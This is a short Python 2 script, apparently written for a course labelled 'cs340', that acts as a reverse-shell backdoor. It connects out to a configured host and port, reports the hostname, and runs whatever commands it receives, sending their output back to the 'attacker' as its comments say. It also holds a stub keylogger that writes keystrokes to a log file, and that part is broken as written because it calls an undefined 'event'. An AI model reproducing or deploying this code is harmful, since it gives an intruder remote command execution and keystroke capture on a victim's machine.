#!/usr/bin/python
import socket,subprocess
import sys, logging

HOST = 'localhost'    # The remote host
PORT = 8089            # The same port as used by the server
LOG_FILENAME = 'cs340-keylog.txt'


def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    #s.send('[*] Connection Established!')
    return s
 

def main():
    cc = start()
    cc.send(socket.gethostname())
    while True:
         # recieve shell command
         data = cc.recv(1024)
         # if its quit, then break out and close socket
         if data == "quit": break
         if data == "keyLogger": keyLogger(event)
         # do shell command
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         # read output
         stdout_value = proc.stdout.read() + proc.stderr.read()
         # send output to attacker
         cc.send(stdout_value)
    # close socket
    cc.close()

def keyLogger(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    print "Key: ", chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True


    

if __name__ == '__main__':
    main()
